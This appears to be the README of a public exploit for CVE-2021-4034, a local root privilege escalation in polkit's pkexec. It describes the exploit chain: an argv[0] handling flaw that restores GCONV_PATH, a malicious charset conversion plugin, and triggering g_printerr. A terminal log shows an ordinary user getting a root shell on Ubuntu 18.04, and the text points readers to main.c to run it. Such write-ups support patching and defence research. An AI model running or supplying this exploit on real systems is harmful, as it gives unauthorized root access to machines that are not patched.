# CVE: CVE-2021-4034
## Short description: Local Privilege Escalation in polkitâ€™s pkexec


This exploit targets a setuid binary /usr/bin/pkexec, installed ubiquitously on linux systems. It leverages a few things:

1. insufficient check of argv[0] in pkexec. This allows to overwrite the environment variables.
2. Some environment variables like GCONV_PATH are privileged. If you can set them you can control a binary by executing arbitrary code. These special environment variables are stripped from setuid binaries for that reason. However, with the pkexec vulnerability we can undo the stripping and readd back a special environment variable.
3. GCONV_PATH variable allows to speciy a custom plugin to convert between charsets. 
4. Each time g_printerr() function prints an message, a conversion is triggered using my custom conversion plugin.
5. Triggering g_printerr() is simple: we pass in a nonexistent SHELL environment variable.


Log from my ubuntu test machine:


```
$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.4 LTS
Release:	18.04
Codename:	bionic
$
$ ./main
Get effective uid: : 0
Setting real effective user id to 0... it returned: 0
bash: groups: command not found
Command 'lesspipe' is available in the following places
 * /bin/lesspipe
 * /usr/bin/lesspipe
The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
lesspipe: command not found
Command 'dircolors' is available in '/usr/bin/dircolors'
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
dircolors: command not found
# /usr/bin/id
uid=0(root) gid=1001(ubuntu) groups=1001(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)
#
```

To run the exploit on your Linux OS, see the instructions in the main.c
